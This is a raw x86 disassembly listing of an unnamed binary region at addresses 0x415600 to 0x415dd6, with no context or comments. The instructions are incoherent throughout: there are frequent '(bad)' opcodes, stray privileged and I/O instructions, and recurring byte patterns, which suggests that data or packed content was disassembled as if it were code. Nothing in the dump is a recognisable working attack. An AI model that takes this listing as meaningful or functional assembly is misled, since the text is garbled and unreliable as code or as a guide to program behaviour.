  415600:	dec    esp
  415601:	enter  0xac64,0x90
  415605:	dec    ecx
  415606:	mov    edi,0x4284cd27
  41560b:	ret    
  41560c:	push   esi
  41560d:	(bad)  
  41560e:	push   esi
  41560f:	mov    ch,0xc9
  415611:	inc    eax
  415612:	cmp    BYTE PTR [ecx+0x43],al
  415615:	add    ah,BYTE PTR [edx+0x57]
  415618:	dec    ecx
  415619:	stos   DWORD PTR es:[edi],eax
  41561a:	push   0x3e
  41561c:	sar    DWORD PTR [esi+0x5507eaa],1
  415622:	das    
  415623:	inc    edx
  415624:	adc    BYTE PTR [ecx+0x40],al
  415627:	xor    edi,DWORD PTR [eax]
  415629:	xchg   BYTE PTR [eax],dl
  41562b:	bound  eax,QWORD PTR [eax+0x41]
  41562e:	and    eax,0x40000500
  415633:	inc    ebx
  415634:	add    eax,0x40624041
  415639:	inc    ebx
  41563a:	add    eax,0x43402541
  41563f:	bound  eax,QWORD PTR [eax+0x43]
  415642:	int3   
  415643:	inc    eax
  415644:	bound  eax,QWORD PTR [eax]
  415646:	inc    ecx
  415647:	inc    eax
  415648:	inc    eax
  415649:	add    eax,0xdd605005
  41564e:	inc    eax
  41564f:	sub    eax,0x816fcd6d
  415654:	inc    ecx
  415655:	xor    al,0x40
  415657:	push   0x53aa4130
  41565c:	pop    eax
  41565d:	add    BYTE PTR [eax+0x65],0xbd
  415661:	sub    eax,0x41673505
  415666:	dec    esp
  415667:	add    BYTE PTR [eax+ecx*2],cl
  41566a:	xchg   BYTE PTR [edx-0x19bfbcb8],cl
  415670:	inc    esi
  415671:	lds    ebp,FWORD PTR [edi+0x3d]
  415674:	jb     0x4156a6
  415676:	inc    eax
  415677:	add    esi,ebx
  415679:	leave  
  41567a:	bound  eax,QWORD PTR [eax+0x25]
  41567d:	add    BYTE PTR [esi+0x40],ah
  415680:	add    eax,0x40404143
  415685:	inc    ebx
  415686:	add    BYTE PTR [eax],al
  415688:	add    BYTE PTR [edx-0x34],ah
  41568b:	inc    eax
  41568c:	add    eax,0x40004041
  415691:	inc    ecx
  415692:	int3   
  415693:	add    BYTE PTR [ebx-0x7c],al
  415696:	add    eax,0x5406240
  41569b:	bound  ebp,QWORD PTR [ecx+0x4074d146]
  4156a1:	inc    ebp
  4156a2:	dec    esp
  4156a3:	push   edi
  4156a4:	add    eax,0x5847ac84
  4156a9:	and    DWORD PTR [ebp+0x72b5863f],edx
  4156af:	test   DWORD PTR [eax-0x33],eax
  4156b2:	push   0xffffffc5
  4156b4:	jp     0x41571a
  4156b6:	rol    DWORD PTR [ebx+0x40],1
  4156b9:	test   DWORD PTR [esi+0x41],esi
  4156bc:	test   al,0x5d
  4156be:	inc    ebx
  4156bf:	nop
  4156c0:	inc    eax
  4156c1:	arpl   WORD PTR [ecx],sp
  4156c3:	sub    eax,0x73dcdc05
  4156c8:	push   esp
  4156c9:	sbb    eax,DWORD PTR [edx+0x44]
  4156cc:	xchg   BYTE PTR [eax-0x1ebfbcb4],bl
  4156d2:	xor    DWORD PTR [eax+0x62],eax
  4156d5:	pop    eax
  4156d6:	inc    ecx
  4156d7:	add    eax,0x40404340
  4156dc:	inc    ebx
  4156dd:	inc    eax
  4156de:	test   BYTE PTR [eax],al
  4156e0:	add    eax,0x40624041
  4156e5:	inc    eax
  4156e6:	add    BYTE PTR [edx+0x5],ah
  4156e9:	inc    ebx
  4156ea:	add    BYTE PTR [eax+0x78],al
  4156ed:	inc    ecx
  4156ee:	add    BYTE PTR [eax+0x41],bl
  4156f1:	(bad)  
  4156f2:	aad    0x30
  4156f4:	mov    esp,0x1240d14f
  4156f9:	add    cl,cl
  4156fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156fc:	push   0x6040c8dd
  415701:	adc    ebx,DWORD PTR [ebp+0x5]
  415704:	pop    ebp
  415705:	inc    eax
  415706:	cs push eax
  415708:	and    eax,0xfc86d346
  41570d:	enter  0x4033,0x2c
  415711:	ror    ch,1
  415713:	xor    al,0x67
  415715:	ins    BYTE PTR es:[edi],dx
  415716:	mov    ebx,0xbf372140
  41571b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41571c:	sbb    DWORD PTR [esi+0x41],ebp
  41571f:	inc    eax
  415720:	dec    edx
  415721:	inc    eax
  415722:	test   BYTE PTR [eax],al
  415724:	int3   
  415725:	bound  eax,QWORD PTR ds:0xcc840f41
  41572b:	inc    ebx
  41572c:	add    BYTE PTR [eax+0x0],al
  41572f:	inc    eax
  415730:	inc    eax
  415731:	inc    eax
  415732:	int3   
  415733:	add    BYTE PTR ds:0x62404341,al
  415739:	pop    eax
  41573a:	add    BYTE PTR [ebx+0x40],al
  41573d:	bound  ecx,QWORD PTR [edi]
  41573f:	inc    eax
  415740:	adc    edi,DWORD PTR [edi+0x43f45005]
  415746:	dec    esp
  415747:	popa   
  415748:	fidivr DWORD PTR [ebp+0x30635a86]
  41574e:	inc    eax
  41574f:	pusha  
  415750:	fild   DWORD PTR [eax+0x34]
  415753:	test   al,0x80
  415755:	jo     0x415797
  415757:	arpl   WORD PTR [ebx],bp
  415759:	int    0xa5
  41575b:	adc    BYTE PTR [eax-0xc77bfb9],ch
  415761:	leave  
  415762:	add    eax,0x858948
  415767:	add    BYTE PTR [eax+0x40],al
  41576a:	cmovno eax,DWORD PTR ds:0x40056243
  415771:	int3   
  415772:	add    ah,cl
  415774:	inc    eax
  415775:	inc    eax
  415776:	bound  eax,QWORD PTR [ecx+0x0]
  415779:	add    BYTE PTR [edi],cl
  41577b:	inc    ebx
  41577c:	inc    eax
  41577d:	inc    eax
  41577e:	add    BYTE PTR [ecx+0x43],al
  415781:	add    eax,0x40256240
  415786:	bound  eax,QWORD PTR [eax]
  415788:	dec    eax
  415789:	and    DWORD PTR [edi+0x44],edx
  41578c:	xchg   BYTE PTR [ecx-0x50bfbc2a],cl
  415792:	mov    edi,0x623b286e
  415797:	nop
  415798:	inc    eax
  415799:	pop    ebp
  41579a:	inc    ebp
  41579b:	int3   
  41579c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41579d:	or     eax,0x654010cd
  4157a2:	mov    bh,0x53
  4157a4:	dec    esp
  4157a5:	sub    al,0x48
  4157a7:	inc    ebx
  4157a8:	inc    esp
  4157a9:	dec    edx
  4157aa:	inc    edx
  4157ab:	inc    ecx
  4157ac:	inc    eax
  4157ad:	rol    BYTE PTR [edi-0x2f],1
  4157b0:	add    eax,0x4140cc00
  4157b5:	inc    eax
  4157b6:	inc    ebx
  4157b7:	bound  esp,QWORD PTR ds:0x41400043
  4157bd:	add    BYTE PTR [eax],al
  4157bf:	add    eax,0x43624062
  4157c4:	inc    ecx
  4157c5:	inc    eax
  4157c6:	inc    eax
  4157c7:	inc    eax
  4157c8:	add    eax,0x40624340
  4157cd:	add    eax,0x40664140
  4157d2:	inc    eax
  4157d3:	popa   
  4157d4:	icebp  
  4157d5:	sub    al,0x64
  4157d7:	mov    esp,0x67481afe
  4157dc:	inc    ebp
  4157dd:	mov    esp,0x41474ef8
  4157e2:	inc    eax
  4157e3:	mov    al,ds:0xbc62c595
  4157e8:	fdivr  st,st(7)
  4157ea:	inc    eax
  4157eb:	xor    eax,0x6941c977
  4157f0:	inc    eax
  4157f1:	loopne 0x415833
  4157f3:	pop    esp
  4157f4:	inc    ebx
  4157f5:	add    BYTE PTR ds:0x41107840,al
  4157fb:	bound  eax,QWORD PTR [eax+0x40]
  4157fe:	sldt   WORD PTR [eax-0x34]
  415802:	js     0x415866
  415804:	add    eax,0x40664143
  415809:	inc    ebx
  41580a:	add    BYTE PTR [ecx+0x5],al
  41580d:	js     0x41584f
  41580f:	bound  eax,QWORD PTR [eax+0x0]
  415812:	inc    eax
  415813:	hlt    
  415814:	jbe    0x415890
  415816:	call   0xe281993f
  41581b:	aas    
  41581c:	sub    ebp,DWORD PTR [ecx+0x40436898]
  415822:	and    ebp,DWORD PTR [ecx]
  415824:	lds    esi,FWORD PTR [eax+0x40304463]
  41582a:	(bad)  
  41582b:	fmul   st,st(5)
  41582d:	inc    ecx
  41582e:	cli    
  41582f:	(bad)  
  415831:	cdq    
  415832:	loope  0x41588b
  415834:	mov    edi,0x47c5e8c0
  415839:	stos   BYTE PTR es:[edi],al
  41583a:	in     al,dx
  41583b:	inc    edi
  41583c:	mov    edi,0x4341cde0
  415841:	inc    eax
  415842:	inc    eax
  415843:	add    eax,0x434162
  415848:	inc    eax
  415849:	add    BYTE PTR [edx+0x5],ah
  41584c:	inc    eax
  41584d:	adc    BYTE PTR [edx+0x40],ah
  415850:	inc    ebx
  415851:	inc    ecx
  415852:	add    eax,0x4340
  415857:	add    eax,0x404162
  41585c:	add    BYTE PTR [eax+0x43],al
  41585f:	inc    eax
  415860:	add    eax,0x217c85f3
  415865:	push   ecx
  415866:	mov    esp,0x43a84957
  41586b:	fwait
  41586c:	stos   DWORD PTR es:[edi],eax
  41586d:	inc    esp
  41586e:	mov    eax,0x90a8dcc0
  415873:	xchg   edx,eax
  415874:	push   eax
  415875:	rcl    ebp,cl
  415877:	ins    BYTE PTR es:[edi],dx
  415878:	and    edi,edx
  41587a:	sub    eax,0xc9222115
  41587f:	into   
  415880:	xor    BYTE PTR [ebx+0x43],ah
  415883:	enter  0x7733,0xbf
  415887:	test   BYTE PTR [eax-0x1aed2e54],al
  41588d:	xor    al,0xbf
  41588f:	push   ss
  415890:	(bad)
  415893:	mov    DWORD PTR [ebp-0x63],0x40bf
  41589a:	inc    ecx
  41589b:	inc    ebx
  41589c:	add    eax,0x41784062
  4158a1:	inc    eax
  4158a2:	inc    eax
  4158a3:	add    BYTE PTR [edi],cl
  4158a5:	bound  eax,QWORD PTR [ebx+0x0]
  4158a8:	add    eax,0x25006240
  4158ad:	inc    eax
  4158ae:	add    eax,0x40254143
  4158b3:	add    eax,0x5c620000
  4158b8:	nop
  4158b9:	adc    eax,0x46e08eba
  4158be:	push   0x65404a03
  4158c3:	mov    ah,BYTE PTR [ecx]
  4158c5:	push   esp
  4158c6:	aad    0xde
  4158c8:	ror    edi,cl
  4158ca:	ret    
  4158cb:	test   al,0x5a
  4158cd:	ss dec edx
  4158cf:	push   ss
  4158d0:	shr    BYTE PTR [eax+0x41],0xd1
  4158d4:	mov    eax,ds:0x4a203b3e
  4158d9:	jo     0x41591e
  4158db:	popa   
  4158dc:	inc    ebx
  4158dd:	inc    ecx
  4158de:	pushf  
  4158df:	sbb    eax,0x4330f431
  4158e4:	add    BYTE PTR [eax],al
  4158e6:	add    BYTE PTR [ecx+0x40],al
  4158e9:	bound  esp,QWORD PTR [esi+0x0]
  4158ec:	inc    eax
  4158ed:	add    eax,0x5400000
  4158f2:	inc    ecx
  4158f3:	inc    eax
  4158f4:	inc    eax
  4158f5:	bound  esp,QWORD PTR ds:0x25050043
  4158fb:	inc    ecx
  4158fc:	inc    ebx
  4158fd:	inc    eax
  4158fe:	test   BYTE PTR [eax+0x0],al
  415901:	bound  ebx,QWORD PTR [eax+0x62]
  415904:	inc    ecx
  415905:	inc    eax
  415906:	xchg   esi,eax
  415907:	loope  0x41591a
  415909:	bound  ebp,QWORD PTR [esi+eax*8-0x319797f3]
  415910:	jle    0x415916
  415912:	gs push 0x79
  415915:	inc    edi
  415916:	inc    eax
  415917:	and    ebx,DWORD PTR [edi]
  415919:	inc    cx
  41591b:	leave  
  41591c:	std    
  41591d:	test   DWORD PTR [eax+0x63],eax
  415920:	push   ecx
  415921:	mov    ebp,0x43414d8c
  415926:	inc    eax
  415927:	and    BYTE PTR ds:0x802c1f02,dl
  41592d:	nop
  41592e:	inc    eax
  41592f:	scas   eax,DWORD PTR es:[edi]
  415930:	adc    BYTE PTR [edx+0x40],ah
  415933:	inc    ecx
  415934:	and    eax,0x40000500
  415939:	inc    ebx
  41593a:	add    eax,0x40624041
  41593f:	inc    ebx
  415940:	add    eax,0x43402541
  415945:	bound  eax,QWORD PTR [eax+0x43]
  415948:	int3   
  415949:	inc    eax
  41594a:	bound  eax,QWORD PTR [eax]
  41594c:	inc    ecx
  41594d:	inc    eax
  41594e:	inc    eax
  41594f:	add    eax,0x3cc56c05
  415954:	ins    BYTE PTR es:[edi],dx
  415955:	leave  
  415956:	retf   0x25db
  415959:	jno    0x4159a5
  41595b:	imul   ebp,DWORD PTR [ecx],0x48f5433e
  415961:	push   esp
  415962:	loop   0x4159c6
  415964:	xor    DWORD PTR ds:0x16a180d1,ecx
  41596a:	clc    
  41596b:	inc    ecx
  41596c:	jns    0x4159aa
  41596e:	stos   DWORD PTR es:[edi],eax
  41596f:	out    0x41,eax
  415971:	pop    ss
  415972:	bound  eax,QWORD PTR [eax+0x25]
  415975:	add    BYTE PTR [esi+0x40],ah
  415978:	add    eax,0x40404143
  41597d:	inc    ebx
  41597e:	add    BYTE PTR [eax],al
  415980:	add    BYTE PTR [edx-0x34],ah
  415983:	inc    eax
  415984:	add    eax,0x40004041
  415989:	inc    ecx
  41598a:	int3   
  41598b:	add    BYTE PTR [ebx-0x7c],al
  41598e:	add    eax,0x5406240
  415993:	bound  ebp,QWORD PTR [ecx-0x74]
  415996:	mov    esp,0xa1474c62
  41599b:	pop    ecx
  41599c:	and    eax,0xbd53532b
  4159a1:	retf   
  4159a2:	(bad)  
  4159a3:	aad    0x52
  4159a5:	sub    al,0xaa
  4159a7:	cmp    BYTE PTR [ebx+0x3e],al
  4159aa:	fs and eax,0x729d5d5
  4159b0:	inc    ecx
  4159b1:	dec    ecx
  4159b2:	cs mov bh,0x58
  4159b5:	inc    esp
  4159b6:	xchg   ecx,eax
  4159b7:	test   al,0x43
  4159b9:	jecxz  0x4159ea
  4159bb:	mov    ebx,0x41586240
  4159c0:	add    eax,0x40404340
  4159c5:	inc    ebx
  4159c6:	inc    eax
  4159c7:	test   BYTE PTR [eax],al
  4159c9:	add    eax,0x40624041
  4159ce:	inc    eax
  4159cf:	add    BYTE PTR [edx+0x5],ah
  4159d2:	inc    ebx
  4159d3:	add    BYTE PTR [eax+0x78],al
  4159d6:	inc    ecx
  4159d7:	add    BYTE PTR [eax+0x41],bl
  4159da:	(bad)  
  4159db:	jmp    0x30a8c914
  4159e0:	jge    0x4159c5
  4159e2:	pop    edi
  4159e3:	cli    
  4159e4:	lea    esi,[eax]
  4159e6:	dec    esp
  4159e7:	fs dec eax
  4159e9:	inc    ebp
  4159ea:	shr    DWORD PTR [ecx+0x63],cl
  4159ed:	dec    esi
  4159ee:	in     al,0x47
  4159f0:	sub    ah,BYTE PTR [ecx]
  4159f2:	pop    edi
  4159f3:	sbb    DWORD PTR [edi],esi
  4159f5:	test   al,0x61
  4159f7:	test   DWORD PTR [edi-0x3dad20a9],edi
  4159fd:	jo     0x4159cc
  4159ff:	inc    ebx
  415a00:	arpl   WORD PTR [ecx-0x7bbf32a1],sp
  415a06:	add    ah,cl
  415a08:	bound  eax,QWORD PTR ds:0xcc840f41
  415a0e:	inc    ebx
  415a0f:	add    BYTE PTR [eax+0x0],al
  415a12:	inc    eax
  415a13:	inc    eax
  415a14:	inc    eax
  415a15:	int3   
  415a16:	add    BYTE PTR ds:0x62404341,al
  415a1c:	pop    eax
  415a1d:	add    BYTE PTR [ebx+0x40],al
  415a20:	bound  ecx,QWORD PTR [edi]
  415a22:	inc    eax
  415a23:	gs adc al,0x79
  415a26:	nop
  415a27:	imul   esi,DWORD PTR [edi],0xffffffdf
  415a2a:	sub    BYTE PTR cs:[bp+si-0x19],ah
  415a2f:	jno    0x415a80
  415a31:	inc    ebx
  415a32:	stc    
  415a33:	and    eax,0x3243c3d5
  415a38:	mov    eax,ds:0x1a6c6537
  415a3d:	dec    eax
  415a3e:	rcl    DWORD PTR [ecx+ecx*2-0x549c40a1],1
  415a45:	(bad)
  415a48:	popa   
  415a49:	lahf   
  415a4a:	mov    edi,0xdecd76
  415a4f:	repz add BYTE PTR [eax],al
  415a52:	inc    eax
  415a53:	inc    eax
  415a54:	cmovno eax,DWORD PTR ds:0x40056243
  415a5b:	int3   
  415a5c:	add    ah,cl
  415a5e:	inc    eax
  415a5f:	inc    eax
  415a60:	bound  eax,QWORD PTR [ecx+0x0]
  415a63:	add    BYTE PTR [edi],cl
  415a65:	inc    ebx
  415a66:	inc    eax
  415a67:	inc    eax
  415a68:	add    BYTE PTR [ecx+0x43],al
  415a6b:	add    eax,0x40256240
  415a70:	bound  eax,QWORD PTR [eax]
  415a72:	push   edi
  415a73:	pop    edi
  415a74:	mov    edi,0x7a681243
  415a79:	bound  esp,QWORD PTR [ecx]
  415a7b:	lahf   
  415a7c:	jl     0x415a73
  415a7e:	arpl   WORD PTR [eax],si
  415a80:	mov    cs,WORD PTR [edx+eax*2]
  415a83:	pop    edi
  415a84:	lds    esp,FWORD PTR [ebx+ecx*2+0x71]
  415a88:	inc    ecx
  415a89:	xchg   ebx,eax
  415a8a:	mov    al,ds:0x7080429f
  415a8f:	int    0x43
  415a91:	call   0xc397b8c3
  415a96:	fdiv   DWORD PTR [bx+si]
  415a99:	and    ah,BYTE PTR [esi*2-0x47e09308]
  415aa0:	pusha  
  415aa1:	push   0x2b6bbfe9
  415aa6:	sub    al,0x5
  415aa8:	add    ah,cl
  415aaa:	inc    eax
  415aab:	inc    ecx
  415aac:	inc    eax
  415aad:	inc    ebx
  415aae:	bound  esp,QWORD PTR ds:0x41400043
  415ab4:	add    BYTE PTR [eax],al
  415ab6:	add    eax,0x43624062
  415abb:	inc    ecx
  415abc:	inc    eax
  415abd:	inc    eax
  415abe:	inc    eax
  415abf:	add    eax,0x40624340
  415ac4:	add    eax,0x40664140
  415ac9:	and    DWORD PTR [esi-0x34],ecx
  415acc:	pop    es
  415acd:	dec    ecx
  415ace:	sub    al,0x68
  415ad0:	(bad)  
  415ad1:	sub    eax,0xb661fb8d
  415ad6:	jp     0x415a5a
  415ad8:	and    BYTE PTR [ebx+eax*2+0x7f],cl
  415adc:	inc    ebx
  415add:	add    eax,0x4c437466
  415ae2:	nop
  415ae3:	mov    bh,0x60
  415ae5:	push   esp
  415ae6:	mov    ebp,0x846dc83a
  415aeb:	(bad)  
  415aec:	mov    bh,0x51
  415aee:	imul   ebx,DWORD PTR [ebp-0x65],0x23114369
  415af5:	inc    eax
  415af6:	sbb    BYTE PTR [eax+ebp*4],dh
  415af9:	inc    edx
  415afa:	shl    esi,1
  415afc:	inc    esi
  415afd:	nop
  415afe:	push   edx
  415aff:	and    BYTE PTR [eax+0x21],0x1c
  415b03:	inc    ebx
  415b04:	add    BYTE PTR ds:0x41107840,al
  415b0a:	bound  eax,QWORD PTR [eax+0x40]
  415b0d:	sldt   WORD PTR [eax-0x34]
  415b11:	js     0x415b75
  415b13:	add    eax,0x40664143
  415b18:	inc    ebx
  415b19:	add    BYTE PTR [ecx+0x5],al
  415b1c:	js     0x415b5e
  415b1e:	bound  eax,QWORD PTR [eax+0x0]
  415b21:	inc    eax
  415b22:	bound  esp,QWORD PTR [ecx+0x3a]
  415b25:	imul   eax,ebp,0x26
  415b28:	xor    esi,edx
  415b2a:	push   ebx
  415b2b:	sbb    DWORD PTR [edx-0x54],eax
  415b2e:	dec    esp
  415b2f:	rcl    BYTE PTR [edx-0x25],cl
  415b32:	retf   0xd361
  415b35:	jae    0x415b79
  415b37:	fcom   QWORD PTR [eax-0x4c]
  415b3a:	stc    
  415b3b:	push   edx
  415b3c:	ret    
  415b3d:	sbb    al,0x64
  415b3f:	(bad)  
  415b40:	retf   
  415b41:	inc    ecx
  415b42:	pop    edx
  415b43:	loope  0x415b18
  415b45:	push   edx
  415b46:	shl    BYTE PTR [edi+0x35],0x43
  415b4a:	pop    ds
  415b4b:	inc    ecx
  415b4c:	inc    ebx
  415b4d:	inc    eax
  415b4e:	inc    eax
  415b4f:	add    eax,0x434162
  415b54:	inc    eax
  415b55:	add    BYTE PTR [edx+0x5],ah
  415b58:	inc    eax
  415b59:	adc    BYTE PTR [edx+0x40],ah
  415b5c:	inc    ebx
  415b5d:	inc    ecx
  415b5e:	add    eax,0x4340
  415b63:	add    eax,0x404162
  415b68:	add    BYTE PTR [eax+0x43],al
  415b6b:	inc    eax
  415b6c:	add    eax,0x4484620
  415b71:	xor    al,0x64
  415b73:	xor    BYTE PTR [eax],bh
  415b75:	in     eax,0xb1
  415b77:	shr    BYTE PTR [eax+0x5d5c4b45],1
  415b7d:	and    eax,0x226b73f7
  415b82:	cmp    al,0x47
  415b84:	mov    al,0xe5
  415b86:	cs inc eax
  415b88:	add    BYTE PTR [eax],al
  415b8a:	inc    ecx
  415b8b:	inc    ebx
  415b8c:	add    eax,0x41784062
  415b91:	inc    eax
  415b92:	inc    eax
  415b93:	add    BYTE PTR [edi],cl
  415b95:	bound  eax,QWORD PTR [ebx+0x0]
  415b98:	add    eax,0x25006240
  415b9d:	inc    eax
  415b9e:	add    eax,0x40254143
  415ba3:	add    eax,0x28620000
  415ba8:	out    dx,al
  415ba9:	test   WORD PTR ds:[ecx-0x3b],sp
  415bae:	adc    al,0x52
  415bb0:	arpl   ax,di
  415bb2:	std    
  415bb3:	inc    ebx
  415bb4:	div    DWORD PTR [edi]
  415bb6:	add    ch,BYTE PTR [ebx+0x5c]
  415bb9:	sbb    al,0xc5
  415bbb:	nop
  415bbc:	cwde   
  415bbd:	sbb    DWORD PTR [esp+ecx*4+0x2],edx
  415bc1:	and    bl,al
  415bc3:	mov    eax,ds:0x51756320
  415bc8:	int    0x2e
  415bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bcb:	inc    ebx
  415bcc:	push   esi
  415bcd:	aas    
  415bce:	push   ebx
  415bcf:	and    al,0x11
  415bd1:	mov    dh,0x73
  415bd3:	ror    DWORD PTR [ecx+0x13],1
  415bd6:	push   edi
  415bd7:	push   cs
  415bd8:	pusha  
  415bd9:	test   al,0xf
  415bdb:	xor    BYTE PTR [ebp+0x436b6e21],dh
  415be1:	add    BYTE PTR [eax],al
  415be3:	add    BYTE PTR [ecx+0x40],al
  415be6:	bound  esp,QWORD PTR [esi+0x0]
  415be9:	inc    eax
  415bea:	add    eax,0x5400000
  415bef:	inc    ecx
  415bf0:	inc    eax
  415bf1:	inc    eax
  415bf2:	bound  esp,QWORD PTR ds:0x25050043
  415bf8:	inc    ecx
  415bf9:	inc    ebx
  415bfa:	inc    eax
  415bfb:	test   BYTE PTR [eax+0x0],al
  415bfe:	bound  ebx,QWORD PTR [eax+0x62]
  415c01:	inc    ecx
  415c02:	inc    eax
  415c03:	pop    ecx
  415c04:	int    0x51
  415c06:	xor    eax,0xad354cc3
  415c0b:	fsubp  st(7),st
  415c0d:	addr16 (bad) 
  415c0f:	outs   dx,BYTE PTR ds:[esi]
  415c10:	mov    eax,ds:0x624b7341
  415c15:	jnp    0x415bb6
  415c17:	hlt    
  415c18:	xlat   BYTE PTR ds:[ebx]
  415c19:	adc    DWORD PTR [eax],ebp
  415c1b:	rcr    dl,1
  415c1d:	mov    esp,0xea10141
  415c22:	push   edx
  415c23:	cmp    BYTE PTR [eax],bh
  415c25:	arpl   WORD PTR [ebx+0x7],ax
  415c28:	adc    BYTE PTR [edx+0x40],ah
  415c2b:	inc    ecx
  415c2c:	and    eax,0x40000500
  415c31:	inc    ebx
  415c32:	add    eax,0x40624041
  415c37:	inc    ebx
  415c38:	add    eax,0x43402541
  415c3d:	bound  eax,QWORD PTR [eax+0x43]
  415c40:	int3   
  415c41:	inc    eax
  415c42:	bound  eax,QWORD PTR [eax]
  415c44:	inc    ecx
  415c45:	inc    eax
  415c46:	inc    eax
  415c47:	add    eax,0x26333d05
  415c4c:	sahf   
  415c4d:	es ret 
  415c4f:	xor    BYTE PTR [ebx],ch
  415c51:	and    DWORD PTR [esi-0x68],ecx
  415c54:	test   al,0xd0
  415c56:	test   al,0x58
  415c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c59:	and    edx,DWORD PTR [esi+eiz*2+0x43606242]
  415c60:	(bad)  
  415c61:	loop   0x415c62
  415c63:	jae    0x415c98
  415c65:	les    esi,FWORD PTR [esi]
  415c67:	fisttp QWORD PTR [eax+0x67]
  415c6a:	sub    BYTE PTR [eax],ch
  415c6c:	xchg   ecx,eax
  415c6d:	dec    edi
  415c6e:	or     ebp,DWORD PTR [ebx+0x56]
  415c71:	pop    ss
  415c72:	bound  eax,QWORD PTR [eax+0x25]
  415c75:	add    BYTE PTR [esi+0x40],ah
  415c78:	add    eax,0x40404143
  415c7d:	inc    ebx
  415c7e:	add    BYTE PTR [eax],al
  415c80:	add    BYTE PTR [edx-0x34],ah
  415c83:	inc    eax
  415c84:	add    eax,0x40004041
  415c89:	inc    ecx
  415c8a:	int3   
  415c8b:	add    BYTE PTR [ebx-0x7c],al
  415c8e:	add    eax,0x5406240
  415c93:	bound  esp,QWORD PTR [edx+0x52]
  415c96:	push   ebp
  415c97:	inc    eax
  415c98:	mov    ds:0xf7635ca7,eax
  415c9d:	es int 0x58
  415ca0:	aad    0xbe
  415ca2:	dec    esi
  415ca3:	inc    ecx
  415ca4:	push   esi
  415ca5:	or     BYTE PTR [ebx+0x3d],al
  415ca8:	bound  eax,QWORD PTR [ebx-0x6c]
  415cab:	mov    eax,ds:0x41586240
  415cb0:	add    eax,0x40404340
  415cb5:	inc    ebx
  415cb6:	inc    eax
  415cb7:	test   BYTE PTR [eax],al
  415cb9:	add    eax,0x40624041
  415cbe:	inc    eax
  415cbf:	add    BYTE PTR [edx+0x5],ah
  415cc2:	inc    ebx
  415cc3:	add    BYTE PTR [eax+0x78],al
  415cc6:	inc    ecx
  415cc7:	add    BYTE PTR [eax+0x41],bl
  415cca:	bound  edx,QWORD PTR [ebp+0x66]
  415ccd:	fadd   DWORD PTR [edx+0x45]
  415cd0:	shl    BYTE PTR [edx+0x4f7313bb],cl
  415cd6:	int    0x53
  415cd8:	push   edx
  415cd9:	add    bl,BYTE PTR [ebx]
  415cdb:	cmc    
  415cdc:	sub    BYTE PTR [eax+0x4b4cbd00],ch
  415ce2:	loop   0x415d3d
  415ce4:	push   edx
  415ce5:	arpl   WORD PTR [edx+0x6a],sp
  415ce8:	test   al,0x13
  415cea:	cs mov bl,0x26
  415ced:	sahf   
  415cee:	out    0x34,al
  415cf0:	iret   
  415cf1:	lds    ecx,FWORD PTR [edi+0x45]
  415cf4:	or     BYTE PTR [ebp-0x3c],ah
  415cf7:	push   esi
  415cf8:	inc    ecx
  415cf9:	mov    ah,cl
  415cfb:	repnz retfw 
  415cfe:	dec    edi
  415cff:	cmp    DWORD PTR [ebx-0x5d],eax
  415d02:	sbb    al,0x1a
  415d04:	es dec ebx
  415d06:	inc    eax
  415d07:	test   BYTE PTR [eax],al
  415d09:	int3   
  415d0a:	bound  eax,QWORD PTR ds:0xcc840f41
  415d10:	inc    ebx
  415d11:	add    BYTE PTR [eax+0x0],al
  415d14:	inc    eax
  415d15:	inc    eax
  415d16:	inc    eax
  415d17:	int3   
  415d18:	add    BYTE PTR ds:0x62404341,al
  415d1e:	pop    eax
  415d1f:	add    BYTE PTR [ebx+0x40],al
  415d22:	bound  ecx,QWORD PTR [edi]
  415d24:	inc    eax
  415d25:	and    DWORD PTR [eax+esi*1-0x59],edx
  415d29:	and    ecx,DWORD PTR [ebx+0x58]
  415d2c:	cdq    
  415d2d:	scas   eax,DWORD PTR es:[edi]
  415d2e:	xchg   esp,eax
  415d2f:	push   esp
  415d30:	lds    edx,FWORD PTR [edi]
  415d32:	xchg   ebx,eax
  415d33:	bound  ecx,QWORD PTR [edx+eiz*2+0x55]
  415d37:	inc    edi
  415d38:	(bad)  [ebx+0x4a84623d]
  415d3e:	cld    
  415d3f:	test   DWORD PTR [eax+0x79],eax
  415d42:	pop    esi
  415d43:	fadd   st,st(3)
  415d45:	xor    eax,0x61404360
  415d4a:	xlat   BYTE PTR ds:[ebx]
  415d4b:	es cs inc eax
  415d4e:	and    BYTE PTR [eax+0x644b4340],dl
  415d54:	sbb    eax,DWORD PTR [eax]
  415d56:	add    BYTE PTR [eax+0x40],al
  415d59:	cmovno eax,DWORD PTR ds:0x40056243
  415d60:	int3   
  415d61:	add    ah,cl
  415d63:	inc    eax
  415d64:	inc    eax
  415d65:	bound  eax,QWORD PTR [ecx+0x0]
  415d68:	add    BYTE PTR [edi],cl
  415d6a:	inc    ebx
  415d6b:	inc    eax
  415d6c:	inc    eax
  415d6d:	add    BYTE PTR [ecx+0x43],al
  415d70:	add    eax,0x40256240
  415d75:	bound  eax,QWORD PTR [eax]
  415d77:	push   esp
  415d78:	inc    ebx
  415d79:	pop    ebx
  415d7a:	inc    eax
  415d7b:	popa   
  415d7c:	icebp  
  415d7d:	bound  esp,QWORD PTR [ebx+0x41]
  415d80:	lods   al,BYTE PTR ds:[esi]
  415d81:	inc    ebx
  415d82:	cmp    eax,0x7cd5620b
  415d87:	add    eax,0xa1ecd16b
  415d8c:	jns    0x415dba
  415d8e:	enter  0x43b8,0x4f
  415d92:	and    edi,edi
  415d94:	icebp  
  415d95:	add    DWORD PTR [edi+0x5],0x40e156a0
  415d9c:	mov    cl,0x64
  415d9e:	add    eax,0x4140cc00
  415da3:	inc    eax
  415da4:	inc    ebx
  415da5:	bound  esp,QWORD PTR ds:0x41400043
  415dab:	add    BYTE PTR [eax],al
  415dad:	add    eax,0x43624062
  415db2:	inc    ecx
  415db3:	inc    eax
  415db4:	inc    eax
  415db5:	inc    eax
  415db6:	add    eax,0x40624340
  415dbb:	add    eax,0x40664140
  415dc0:	cmp    al,BYTE PTR [eax-0x3a]
  415dc3:	test   al,0xc8
  415dc5:	mov    al,ds:0x626efa2f
  415dca:	inc    ebx
  415dcb:	mov    ch,0xf
  415dcd:	and    esp,ebp
  415dcf:	sbb    eax,0x418133a8
  415dd4:	jg     0x415e18
  415dd6:	int3   
